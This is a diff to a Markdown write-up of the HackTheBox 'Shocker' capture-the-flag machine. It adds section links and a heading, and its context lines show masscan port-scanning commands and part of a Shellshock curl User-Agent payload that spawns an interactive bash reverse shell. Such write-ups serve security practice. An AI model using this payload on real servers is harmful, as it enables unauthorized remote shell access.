@@ -11,6 +11,13 @@
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd5a38d8-aeda-4f02-891d-acb679295a3f)
 
 
+## Sections
++ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/03_Shocker.md#enumeration)
++ [Gaining Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/03_Shocker.md#gaining-access)
++ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/03_Shocker.md#privilege-escalation)
++ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/03_Shocker.md#links)
+
+
 ## Enumeration
 + `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.56 -e tun0 > ports`
 + `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -65,6 +72,8 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + Get root.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c4f85588-6979-435d-b7ef-466ca66b7e4d)
 
+
+# Links
 
 # References & Alternatives
 + https://vvmlist.github.io/#shock
